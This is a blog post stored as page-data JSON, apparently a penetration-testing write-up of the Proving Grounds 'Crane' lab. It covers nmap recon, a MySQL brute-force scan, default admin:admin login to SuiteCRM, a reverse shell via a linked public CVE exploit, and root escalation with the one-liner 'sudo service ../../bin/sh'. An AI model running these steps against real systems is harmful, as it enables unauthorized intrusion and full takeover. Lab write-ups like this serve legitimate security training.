{"componentChunkName":"component---src-templates-post-template-tsx","path":"/241017/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h2>1. Recon</h2>\n<p>Starting with nmap scan as always.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hlee㉿hlee)-[~]                                                                     \r\n└─$ sudo nmap 192.168.151.146 -T4 -p-                                        \r\n\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 14:53 EDT            \r\nPORT      STATE SERVICE                                                      \r\n\r\n22/tcp    open  ssh                                                          \r\n80/tcp    open  http                                                          \r\n3306/tcp  open  mysql                                                        \r\n33060/tcp open  mysqlx                                                        </code></pre></div>\n<p>So there is a webapp besides mysql server. Let’s try webapp first.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/a0a10/1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 54.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAABNUlEQVR42qWSO08CQRSF5xdqYexMLDA2+hP8ITZa2RgLKJTCxA6QV2O0sBL2gYg0MK/dmcE93gEKhEWzsfgyM2fOublzM+z84BAXpWOcnpxhf/cIezulf8FGQYRRGGEQDxH0IvTXCQYI4g/E0TvCIN68XxL0Y/TeQrDEGGgiTVMYa1ags7MwfAI9jDH+HIMLAeu1Hz7KUt7riUnBlFTIhQso6yCfuhheXaJ8c4eX51cYCkkhN/xa6bnOlCJhC0mSwL/AZcBXlmE2m8Fam+vVmgrKvwpyjmQ6gVMSlnCkWQoWL+hDfAp+fwteuQavVojyYv9QhaJZKqWLd6ikWCDW+K1DQYatkCGXHK8vxmlEzA/ZLbEraxGMzzk3/z6s0WiiVmugTmt9uX9sttBqdwrR7nTRbLXxDVVMHDUDVdrHAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/a59e9/1.webp 192w,\n/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/0ca9f/1.webp 384w,\n/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/dc9b9/1.webp 768w,\n/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/e2c2f/1.webp 1152w,\n/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/d59e9/1.webp 1281w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/3b721/1.png 192w,\n/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/66595/1.png 384w,\n/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/fe486/1.png 768w,\n/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/d2d74/1.png 1152w,\n/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/a0a10/1.png 1281w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/fe486/1.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>So this is SuiteCrm, I’ve never seen it before.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\n┌──(hlee㉿hlee)-[~]\r\n└─$ searchsploit suitecrm                          \r\n\r\n Exploit Title                                                              \r\n\r\nSuiteCRM 7.10.7 - 'parentTab' SQL Injection | php/webapps/46310.txt\r\nSuiteCRM 7.10.7 - 'record' SQL Injection | php/webapps/46311.txt\r\nSuiteCRM 7.11.15 - 'last_name' Remote Code Execution (Authenticated) php/webapps/49001.py\r\nSuiteCRM 7.11.18 - Remote Code Execution (RCE) (Authenticated) (Metasploit)   | php/webapps/50531.rb\r\nShellcodes: No Results\r\n</code></pre></div>\n<p>Okay, we need credentials, which we can possibly find from mysql server.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\n┌──(hlee㉿hlee)-[~]\r\n└─$ sudo nmap 192.168.151.146 -T4 -sV -sC -p3306 --script mysql*\r\n\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 14:58 EDT\r\n  \r\n\r\nPORT     STATE SERVICE VERSION\r\n\r\n3306/tcp open  mysql   MySQL (unauthorized)\r\n| mysql-enum:\r\n|   Accounts: No valid accounts found\r\n|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0\r\n|_mysql-empty-password: Host '192.168.45.247' is not allowed to connect to this MySQL server\r\n| mysql-brute:\r\n|   Accounts: No valid accounts found\r\n|_  Statistics: Performed 50009 guesses in 207 seconds, average tps: 250.0\r\n\r\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 207.15 seconds\r\n</code></pre></div>\n<p>Nevermind. mysql server was a rabbit hole, credential was admin:admin.</p>\n<h2>2. Initial Foothold</h2>\n<p>After I logged in, I found out that this suitecrm is version 7.12.3</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/570cce7e254d2746801ffaa286cf3390/a546b/2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.25%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/UlEQVR42p1Py07DMBDM//9CT1RC0B4qKnGo+AdEBYJKbdq87dgJTtI4Tw6Ds24lJE5wGO3szO5o16ndParlDcRijs36CQ+rDV637xjHAVprNE3zJzj1fgd9O4Ocz7C6W2N5/4iX5zeMX+P/AlV1RiwVhKpI0LWmIIvmB7fhVHVz4b9951xVyGUO9alQliWKojAoMQwD+r5DZ2B5T/1Vt73F1afAQhXwvRCBH8E9ePBOAbIsx9H1EAYxkoSTH8cMUZhg93Gg2YlPs3HEcDr6pHVdB6c01yRmmLGUlqXM6MopTKQSUmRgRhemCiHBeYrMfDT1nAvyudmdvLZt8Q2eO8G6Z0w9fwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/570cce7e254d2746801ffaa286cf3390/a59e9/2.webp 192w,\n/static/570cce7e254d2746801ffaa286cf3390/0ca9f/2.webp 384w,\n/static/570cce7e254d2746801ffaa286cf3390/dc9b9/2.webp 768w,\n/static/570cce7e254d2746801ffaa286cf3390/0a35c/2.webp 772w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/570cce7e254d2746801ffaa286cf3390/3b721/2.png 192w,\n/static/570cce7e254d2746801ffaa286cf3390/66595/2.png 384w,\n/static/570cce7e254d2746801ffaa286cf3390/fe486/2.png 768w,\n/static/570cce7e254d2746801ffaa286cf3390/a546b/2.png 772w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/570cce7e254d2746801ffaa286cf3390/fe486/2.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>That means none of the exploits above would work. I googled some authenticated cve’s.</p>\n<p>Then I found this one:</p>\n<blockquote>\n<p><a href=\"https://github.com/manuelz120/CVE-2022-23940\" target=\"_blank\" rel=\"nofollow\">https://github.com/manuelz120/CVE-2022-23940</a></p>\n</blockquote>\n<p>I followed the step, then:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/dd1811656c496cddc23b57e7a26aa168/bab36/3.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.645833333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABD0lEQVR42l2Ra26DMBCEuUeTtCEkGGz8wIB5lgKKqvb+95munRKp/fFprfVoPLuOlJ2Q8Qo3ZnBNNRLPTQUuVxlqodoALxoI6SCUA8st4qQImgCdE1YhEiTMRU3ChurD2Au8OE4k3mIBbQd8rN8Ypjum+RPz8oW2X4P2fBFP44SIzjEPzf3iz6uE79vmHSOZ9cOGjmi7BVJ3j4l+J9mniXaT/0Y7vi+0g6lnWMK1M2o3w1Bqv6qcYFlJ5ooSa0SHU4qd42sWOHhOLPByTGlfFXQ5QdN6rOmgqEraJcsMGD3KySijdKlPaMoBT+wYKOmj9rPv22GFHu9UNzTThmrcUA4LeNUjp/Tc0D8Yh0zW+AHOLLf6VAqL5gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/dd1811656c496cddc23b57e7a26aa168/a59e9/3.webp 192w,\n/static/dd1811656c496cddc23b57e7a26aa168/0ca9f/3.webp 384w,\n/static/dd1811656c496cddc23b57e7a26aa168/dc9b9/3.webp 768w,\n/static/dd1811656c496cddc23b57e7a26aa168/e2c2f/3.webp 1152w,\n/static/dd1811656c496cddc23b57e7a26aa168/f3efb/3.webp 1536w,\n/static/dd1811656c496cddc23b57e7a26aa168/57d79/3.webp 1906w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/dd1811656c496cddc23b57e7a26aa168/3b721/3.png 192w,\n/static/dd1811656c496cddc23b57e7a26aa168/66595/3.png 384w,\n/static/dd1811656c496cddc23b57e7a26aa168/fe486/3.png 768w,\n/static/dd1811656c496cddc23b57e7a26aa168/d2d74/3.png 1152w,\n/static/dd1811656c496cddc23b57e7a26aa168/e8464/3.png 1536w,\n/static/dd1811656c496cddc23b57e7a26aa168/bab36/3.png 1906w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/dd1811656c496cddc23b57e7a26aa168/fe486/3.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>I got the revshell. as I did <code class=\"language-text\">sudo -l</code></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 726px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/bb922edc735c0d4557645e09ed19b0e8/c04c8/4.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAsUlEQVR42l1PWw6DMAzjKgNamFhf0FLek5i0+9/Ia0K3j31YdqLaTot5PeGGDUpHaDvB9is6FfDQY+IR984zKxNRS4NbpVDW+sf/ugjxiXl9wY8HpuXEdrwRxieHKjMxbL9kPaeiKSHyTPraXWUcOPgdjHCw0bgZvd+4gHgIezZHfkPX1tJCNg6CuO0hkq6EYRT0ReMWDClApzACzSZfJVqHurEcIpKZ+GsuMyrayUt/ALLqfB0bxw6+AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/bb922edc735c0d4557645e09ed19b0e8/a59e9/4.webp 192w,\n/static/bb922edc735c0d4557645e09ed19b0e8/0ca9f/4.webp 384w,\n/static/bb922edc735c0d4557645e09ed19b0e8/b0d8b/4.webp 726w\"\n              sizes=\"(max-width: 726px) 100vw, 726px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/bb922edc735c0d4557645e09ed19b0e8/3b721/4.png 192w,\n/static/bb922edc735c0d4557645e09ed19b0e8/66595/4.png 384w,\n/static/bb922edc735c0d4557645e09ed19b0e8/c04c8/4.png 726w\"\n            sizes=\"(max-width: 726px) 100vw, 726px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/bb922edc735c0d4557645e09ed19b0e8/c04c8/4.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Cool! No password + a binary!</p>\n<h2>3. Privesc</h2>\n<p>I used my friend gtfobins.</p>\n<blockquote>\n<p><a href=\"https://gtfobins.github.io/gtfobins/service/\" target=\"_blank\" rel=\"nofollow\">https://gtfobins.github.io/gtfobins/service/</a></p>\n</blockquote>\n<p>We can simply run:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">sudo service ../../bin/sh</code></pre></div>\n<p>As I tried, I could successfully get a shell as root user.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 264px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/d495fde94496b14a9ceb57edbb9ae31b/df2dd/5.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 29.6875%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA1UlEQVR42qWPyQ6CMBiE+yTuuKACAi4sFcoWRNEY9OJjqBeffixtMPGqhy9tpvPPPyVj1URf0TDXN0iyEgHLYZguomSPfXlBlp/E/VzdsLB8aNxXHq/YhrnQ63cWFfBoguJQgdAgg73aIs2O8GkKy6ZgsTQ4Xoy1w8TCmbYSWEsqFjtuhJDtsFwHaHUm6HSnaLUnIAEXa+L0gDDc8WFdBDQMhjpHno3WG8y/PBKpEX3hinYebzdWrc/Ar5D74yW+ps5stHntf8Jk4PMFZWTwMPXvdnXgG5u1vHP12uPCAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/d495fde94496b14a9ceb57edbb9ae31b/a59e9/5.webp 192w,\n/static/d495fde94496b14a9ceb57edbb9ae31b/3ffc2/5.webp 264w\"\n              sizes=\"(max-width: 264px) 100vw, 264px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/d495fde94496b14a9ceb57edbb9ae31b/3b721/5.png 192w,\n/static/d495fde94496b14a9ceb57edbb9ae31b/df2dd/5.png 264w\"\n            sizes=\"(max-width: 264px) 100vw, 264px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/d495fde94496b14a9ceb57edbb9ae31b/df2dd/5.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Done!</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>Proving Grounds</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"Proving Grounds : Crane","summary":"Solving Crane machine from Proving Grounds","date":"2024.10.17.","before":"2024.10.14.","after":"2024.10.24.","categories":["C-SEC","proving_grounds","pentest","ENG"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAABNUlEQVR42qWSO08CQRSF5xdqYexMLDA2+hP8ITZa2RgLKJTCxA6QV2O0sBL2gYg0MK/dmcE93gEKhEWzsfgyM2fOublzM+z84BAXpWOcnpxhf/cIezulf8FGQYRRGGEQDxH0IvTXCQYI4g/E0TvCIN68XxL0Y/TeQrDEGGgiTVMYa1ags7MwfAI9jDH+HIMLAeu1Hz7KUt7riUnBlFTIhQso6yCfuhheXaJ8c4eX51cYCkkhN/xa6bnOlCJhC0mSwL/AZcBXlmE2m8Fam+vVmgrKvwpyjmQ6gVMSlnCkWQoWL+hDfAp+fwteuQavVojyYv9QhaJZKqWLd6ikWCDW+K1DQYatkCGXHK8vxmlEzA/ZLbEraxGMzzk3/z6s0WiiVmugTmt9uX9sttBqdwrR7nTRbLXxDVVMHDUDVdrHAAAAAElFTkSuQmCC"},"images":{"fallback":{"src":"/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/e6979/1.png","srcSet":"/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/64b28/1.png 320w,\n/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/0753d/1.png 641w,\n/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/e6979/1.png 1281w","sizes":"(min-width: 1281px) 1281px, 100vw"},"sources":[{"srcSet":"/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/3626a/1.webp 320w,\n/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/2342d/1.webp 641w,\n/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/8a9f2/1.webp 1281w","type":"image/webp","sizes":"(min-width: 1281px) 1281px, 100vw"}]},"width":1281,"height":696}},"publicURL":"/static/9cb6fb7705d0aae7b9f9a4e1f2fa79db/1.png"}}}}]}},"pageContext":{"slug":"/241017/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}